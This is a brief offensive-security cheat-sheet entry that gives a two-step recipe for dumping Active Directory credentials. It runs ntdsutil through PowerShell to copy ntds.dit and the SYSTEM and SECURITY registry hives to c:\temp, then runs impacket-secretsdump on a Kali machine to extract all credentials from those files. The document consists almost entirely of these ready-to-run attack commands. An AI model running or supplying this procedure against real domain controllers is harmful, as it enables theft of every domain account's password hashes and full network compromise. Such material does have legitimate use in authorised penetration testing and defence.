# ntdsutil.exe - no credential required

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration" %}

{% code overflow="wrap" %}
```bash
CMD> powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

# We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

# Dump all credentials 
Kali> impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local

```
{% endcode %}

